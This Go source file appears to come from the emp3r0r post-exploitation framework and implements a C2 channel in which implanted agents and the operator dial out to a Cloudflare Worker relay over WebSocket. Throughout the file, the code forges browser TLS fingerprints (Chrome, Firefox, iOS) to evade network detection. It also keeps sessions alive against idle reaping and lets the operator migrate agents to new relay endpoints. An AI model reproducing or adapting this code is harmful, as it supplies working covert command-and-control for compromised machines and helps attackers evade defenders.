// Package transport — c2channel_workerws.go
//
// rendezvous relay channel: both agent and CC dial OUT to a CF Worker relay
// (see emp3r0r-cf-relay/). The Worker pairs the two WebSocket ends per room
// and shuffles opaque bytes; all crypto (SecureConn/MsgAuth) stays end-to-end.
//
// Framing (relay level, see relay_do.js):
//   agent -> relay: raw binary payload
//   relay  -> cc:   [tag byte][payload]
//   cc -> relay:    [tag byte | 0xFF broadcast][payload]
//   relay -> agent: raw binary payload
package transport

import (
	"bytes"
	"context"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	utls "github.com/refraction-networking/utls"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RelayRoomMsg is the JSON hello/control frame exchanged over the relay WS.
type RelayRoomMsg struct {
	T      string   `json:"t"`
	Role   string   `json:"role,omitempty"`
	Tag    string   `json:"tag,omitempty"`
	Agents []string `json:"agents,omitempty"`
	CC     bool     `json:"cc,omitempty"` // agent hello: whether a CC is in the room
}

// WorkerWSChannelWrapper implements C2ChannelWrapper over the CF relay.
// URL format (agent config CCAddress or CC dial target):
//
//	wss://relay.example.com/ws/<room>?role=<cc|agent>&secret=<shared>
type WorkerWSChannelWrapper struct {
	// TagByte is the relay-level routing marker for CC->agent frames.
	// Agents ignore it (relay strips it before delivery); CC sets it.
	Role string // "agent" (default) or "cc"
}

func init() {
	RegisterC2Channel("worker_ws", "Rendezvous relay over Cloudflare Worker (both ends dial out)", &WorkerWSChannelWrapper{})
}

// ---- shared plumbing --------------------------------------------------------

// relayTLSRootCAs optionally overrides the system root pool used to verify
// relay endpoints (used by tests to trust a local TLS server).
var relayTLSRootCAs *x509.CertPool

// browserHelloSpecs builds browser-mimicking ClientHello specs (Chrome /
// Firefox / iOS) with one surgical change: the ALPN extension is rewritten to
// offer only "http/1.1". Real browsers advertise h2 first, and if the edge
// negotiates h2 the HTTP/1.1 WebSocket upgrade that follows would break.
// Everything else — cipher suites, extensions, curves, GREASE — stays exactly
// as the browser sends it, so the JA3/JA4 fingerprint looks authentic.
func browserHelloSpecs() ([]*utls.ClientHelloSpec, error) {
	ids := []utls.ClientHelloID{
		utls.HelloChrome_Auto,
		utls.HelloFirefox_Auto,
		utls.HelloIOS_Auto,
	}
	var specs []*utls.ClientHelloSpec
	for _, id := range ids {
		spec, err := utls.UTLSIdToSpec(id)
		if err != nil {
			return nil, err
		}
		replaced := false
		for i, ext := range spec.Extensions {
			if _, ok := ext.(*utls.ALPNExtension); ok {
				spec.Extensions[i] = &utls.ALPNExtension{AlpnProtocols: []string{"http/1.1"}}
				replaced = true
			}
		}
		if replaced {
			specs = append(specs, &spec)
		}
	}
	return specs, nil
}

// dialRelayTLS dials TCP and completes a uTLS handshake for relay WSS
// connections (both agent and CC sides).
//
// The ClientHello mimics a real browser (randomly picked among Chrome,
// Firefox, iOS — the most common fingerprints on any network) with ALPN
// pinned to http/1.1 so the WebSocket upgrade works. If spec generation
// fails for any reason we fall back to HelloRandomizedNoALPN (fresh random
// JA3 per connection, no ALPN => HTTP/1.1) — still far from Go's static
// fingerprint.
func dialRelayTLS(ctx context.Context, network, addr string) (net.Conn, error) {
	// Independent dialer: the agent may replace net.DefaultResolver with a
	// DoH resolver whose upstream is unreachable in relay-only networks;
	// relay endpoints must resolve via plain system DNS.
	// Force IPv4: CF edges are IPv4-reachable everywhere, while hosts with a
	// configured-but-unrouted IPv6 stack would otherwise fail the dial with
	// ENETUNREACH before falling back.
	conn, err := (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp4", addr)
	if err != nil {
		return nil, err
	}
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("relay TLS dial: bad addr %q: %w", addr, err)
	}
	// CF public cert chain is verified by the system pool (InsecureSkipVerify
	// stays false; a pinned CA is unnecessary — the endpoint is a CF domain).
	cfg := &utls.Config{ServerName: host, RootCAs: relayTLSRootCAs}
	var uconn *utls.UConn
	specs, specErr := browserHelloSpecs()
	if specErr == nil && len(specs) > 0 {
		spec := specs[util.RandInt(0, len(specs))]
		uconn = utls.UClient(conn, cfg, utls.HelloCustom)
		if err = uconn.ApplyPreset(spec); err != nil {
			uconn = utls.UClient(conn, cfg, utls.HelloRandomizedNoALPN)
		}
	} else {
		uconn = utls.UClient(conn, cfg, utls.HelloRandomizedNoALPN)
	}
	uconn.SetDeadline(time.Now().Add(10 * time.Second)) // handshake must never hang
	if err = uconn.Handshake(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("relay TLS handshake %s: %w", host, err)
	}
	return uconn, nil
}

var relayDialer = &websocket.Dialer{
	HandshakeTimeout: 15 * time.Second,
	// NetDialTLSContext: gorilla skips its own TLS handshake and uses the
	// connection we return — a *utls.UConn with a randomized ClientHello.
	NetDialTLSContext: dialRelayTLS,
	ReadBufferSize:    1 << 16,
	WriteBufferSize:   1 << 16,
}

// relayConn adapts a websocket to net.Conn-ish io.ReadWriteCloser.
type relayConn struct {
	conn   *websocket.Conn
	role   string
	tag    byte // cc side: current target agent tag byte (0xFF = broadcast)
	tagMu  sync.Mutex
	rbuf   *bytes.Buffer
	isCC   bool
	closed bool
	mu     sync.Mutex
	pingStop chan struct{} // closed by Close() to stop the keepalive pinger
	pingOnce sync.Once
}

// startPinger sends a WebSocket ping every 30s so CF's edge doesn't reap the
// connection as idle (observed as 1006 unexpected EOF after ~19-30min).
// Only the read side of each party needs to stay alive for pong replies to be
// automatic (gorilla handles pong internally); the Worker DO forwards pings
// as binary/text data frames? No — ping/pong are control frames handled by
// the WS stack on both ends, so we ping and gorilla auto-pongs; the DO's
// accept-mode socket does the same. Either way, traffic flows both directions.
func (r *relayConn) startPinger() {
	r.pingStop = make(chan struct{})
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-r.pingStop:
				return
			case <-ticker.C:
				r.mu.Lock()
				if r.closed {
					r.mu.Unlock()
					return
				}
				err := r.conn.WriteControl(websocket.PingMessage,
					[]byte("keepalive"), time.Now().Add(5*time.Second))
				r.mu.Unlock()
				if err != nil {
					return
				}
			}
		}
	}()
}

// relayMigration carries the newest relay endpoint the operator's hot
// migration asked agents to move to. relayConn surfaces close(4002) frames
// here; the agent's connect loop consumes it and re-dials the new endpoint.
var relayMigration atomic.Value // string

// SetRelayMigration records the new relay endpoint (wss://...) announced by
// the relay's migration pointer.
func SetRelayMigration(u string) {
	if u != "" {
		relayMigration.Store(u)
	}
}

// RelayMigration returns the pending migration endpoint, or "".
func RelayMigration() string {
	v, _ := relayMigration.Load().(string)
	return v
}

// relayMigrationClose reports whether a read error is the relay's migration
// close frame (4002 + wss:// reason), recording the new endpoint.
func relayMigrationClose(err error) (string, bool) {
	ce, ok := err.(*websocket.CloseError)
	if !ok || ce.Code != 4002 {
		return "", false
	}
	target := strings.TrimSpace(ce.Text)
	if !strings.HasPrefix(target, "ws://") && !strings.HasPrefix(target, "wss://") {
		return "", false
	}
	SetRelayMigration(target)
	return target, true
}

func (r *relayConn) Read(p []byte) (int, error) {
	for {
		if r.rbuf.Len() > 0 {
			return r.rbuf.Read(p)
		}
		mt, data, err := r.conn.ReadMessage()
		if err != nil {
			if target, ok := relayMigrationClose(err); ok {
				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
			}
			return 0, err
		}
		if mt == websocket.TextMessage {
			// control frame from relay (hello/pong/agent-joined) — ignore on data path
			continue
		}
		if r.isCC {
			// strip tag byte
			if len(data) < 1 {
				continue
			}
			data = data[1:]
		}
		r.rbuf.Write(data)
	}
}

func (r *relayConn) Write(p []byte) (int, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return 0, errors.New("relay closed")
	}
	if r.isCC {
		r.tagMu.Lock()
		tag := r.tag
		r.tagMu.Unlock()
		buf := make([]byte, 0, len(p)+1)
		buf = append(buf, tag)
		buf = append(buf, p...)
		if err := r.conn.WriteMessage(websocket.BinaryMessage, buf); err != nil {
			return 0, err
		}
		return len(p), nil
	}
	if err := r.conn.WriteMessage(websocket.BinaryMessage, p); err != nil {
		return 0, err
	}
	return len(p), nil
}

func (r *relayConn) Close() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.closed {
		return nil
	}
	r.closed = true
	if r.pingStop != nil {
		r.pingOnce.Do(func() { close(r.pingStop) })
	}
	return r.conn.Close()
}

func (r *relayConn) SetTargetAgent(tagByte byte) {
	r.tagMu.Lock()
	r.tag = tagByte
	r.tagMu.Unlock()
}

// net.Conn compatibility shims (same approach as ByteReadWriteCloser)
func (r *relayConn) LocalAddr() net.Addr                { return nil }
func (r *relayConn) RemoteAddr() net.Addr               { return nil }
func (r *relayConn) SetDeadline(t time.Time) error      { return nil }
func (r *relayConn) SetReadDeadline(t time.Time) error  { return nil }
func (r *relayConn) SetWriteDeadline(t time.Time) error { return nil }

// parseRelayURL validates the relay endpoint and extracts role/secret.
func parseRelayURL(raw string) (*url.URL, string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return nil, "", err
	}
	role := u.Query().Get("role")
	if role == "" {
		role = "agent"
	}
	if role != "agent" && role != "cc" {
		return nil, "", fmt.Errorf("bad relay role %q", role)
	}
	_ = u.Query().Get("secret") // secret validated server-side; kept for compat
	return u, role, nil
}

// dialRelay opens the relay WebSocket and waits for the hello control frame.
// For agent-role dials, it waits until a CC is present in the room (hello.cc):
// otherwise the agent sends its checkin into a void — the DO drops frames
// when no CC is joined — and blocks forever waiting for an ACK.
func dialRelay(ctx context.Context, raw string) (*relayConn, *RelayRoomMsg, error) {
	u, role, err := parseRelayURL(raw)
	if err != nil {
		return nil, nil, err
	}
	// gorilla requires ws:// or wss:// scheme
	wsURL := u.String()
	if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		// infer from scheme or default to wss for anything non-local
		scheme := "wss"
		if u.Scheme == "http" {
			scheme = "ws"
		}
		wsURL = scheme + "://" + strings.TrimPrefix(wsURL, u.Scheme+"://")
	}
	deadline := time.Now().Add(30 * time.Second)
	for {
		conn, resp, err := relayDialer.DialContext(ctx, wsURL, nil)
		if err != nil {
			if resp != nil {
				// 409 + X-Relay-Migrated-To: the old deployment was repointed
				// at a newer one — record it so the agent re-dials the new endpoint.
				if mig := resp.Header.Get("X-Relay-Migrated-To"); mig != "" {
					SetRelayMigration(mig)
					return nil, nil, fmt.Errorf("relay migrated by operator to %s", mig)
				}
				return nil, nil, fmt.Errorf("relay dial: %s (HTTP %d)", err, resp.StatusCode)
			}
			return nil, nil, fmt.Errorf("relay dial: %w", err)
		}
		rc := &relayConn{conn: conn, role: role, tag: 0xFF, rbuf: new(bytes.Buffer), isCC: role == "cc"}
		// wait hello (text)
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		_, raw_hello, err := conn.ReadMessage()
		if err != nil {
			if target, ok := relayMigrationClose(err); ok {
				logging.Warningf("relay migrated by operator to %s, re-dialing", target)
			}
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello: %w", err)
		}
		conn.SetReadDeadline(time.Time{})
		var hello RelayRoomMsg
		if err := json.Unmarshal(raw_hello, &hello); err != nil || hello.T != "hello" {
			_ = conn.Close()
			return nil, nil, fmt.Errorf("relay hello invalid: %s", string(raw_hello)[:min(64, len(raw_hello))])
		}
		// agent must not fire its checkin into a CC-less room
		if role == "agent" && !hello.CC {
			_ = conn.Close()
			if time.Now().After(deadline) {
				return nil, nil, fmt.Errorf("relay room has no CC (waited 30s)")
			}
			time.Sleep(2 * time.Second)
			continue
		}
		rc.startPinger()
		return rc, &hello, nil
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ---- agent side: C2ChannelWrapper -------------------------------------------

// Dial implements C2ChannelWrapper (agent -> relay -> cc).
func (w *WorkerWSChannelWrapper) Dial(ctx context.Context, client *http.Client, url string) (io.ReadWriteCloser, *http.Response, error) {
	rc, hello, err := dialRelay(ctx, url)
	if err != nil {
		return nil, nil, err
	}
	_ = hello
	return rc, &http.Response{StatusCode: http.StatusOK}, nil
}

// Accept is not used on the agent side.
func (w *WorkerWSChannelWrapper) Accept(w2 http.ResponseWriter, req *http.Request) (io.ReadWriteCloser, error) {
	return nil, errors.New("Accept not implemented for worker_ws (CC uses CCRelayListener)")
}
